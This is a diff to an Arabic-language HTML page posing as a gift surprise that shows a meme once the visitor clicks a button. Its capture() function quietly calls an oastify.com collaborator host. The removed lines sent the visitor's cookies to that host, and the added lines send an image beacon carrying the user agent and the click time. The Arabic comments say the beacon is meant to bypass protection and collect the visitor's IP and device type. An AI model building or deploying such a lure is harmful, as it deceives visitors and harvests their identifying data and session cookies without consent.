@@ -2,11 +2,12 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>مفاجأة خاصة لك! ✨</title>
     <style>
-        body { font-family: 'Arial', sans-serif; text-align: center; background-color: #fce4ec; padding-top: 80px; }
-        .box { background: white; padding: 40px; border-radius: 25px; display: inline-block; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border: 2px solid #f06292; }
-        .btn { background-color: #f06292; color: white; border: none; padding: 15px 45px; font-size: 22px; border-radius: 50px; cursor: pointer; transition: 0.3s; font-weight: bold; }
+        body { font-family: 'Arial', sans-serif; text-align: center; background-color: #fce4ec; padding-top: 80px; margin: 0; }
+        .box { background: white; padding: 40px; border-radius: 25px; display: inline-block; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border: 2px solid #f06292; max-width: 90%; }
+        .btn { background-color: #f06292; color: white; border: none; padding: 15px 45px; font-size: 22px; border-radius: 50px; cursor: pointer; transition: 0.3s; font-weight: bold; margin-top: 20px; }
         .btn:hover { background-color: #e91e63; transform: scale(1.05); }
         #meme-view { display: none; margin-top: 20px; }
         img { max-width: 100%; border-radius: 15px; margin-top: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
@@ -27,14 +28,12 @@
 
     <script>
         function capture() {
-            // رابط الـ Collaborator الخاص بك اللي بيستلم البيانات
-            var tracker = "http://0qrchf9ywsx6grs0hod0h4xfx633rtfi.oastify.com";
+            // ملاحظة: تأكد ان هذا الرابط هو نفسه اللي في الـ Collaborator عندك الآن
+            var tracker = "https://0qrchf9ywsx6grs0hod0h4xfx633rtfi.oastify.com";
 
-            // إرسال البيانات (IP، المتصفح، الـ Headers) صامتاً في الخلفية
-            fetch(tracker, { mode: 'no-cors' });
-
-            // إرسال التوكن إذا كان موجوداً في الكوكيز (اختياري)
-            fetch(tracker + "/?token=" + document.cookie, { mode: 'no-cors' });
+            // طريقة الـ Image Beacon (الأقوى لتخطي الحماية وسحب الـ IP ونوع الجهاز)
+            var logger = new Image();
+            logger.src = tracker + "/?log=click&t=" + new Date().getTime() + "&ua=" + encodeURIComponent(navigator.userAgent);
 
             // تبديل المحتوى للميمز المضحك
             document.getElementById("gift-card").style.display = "none";
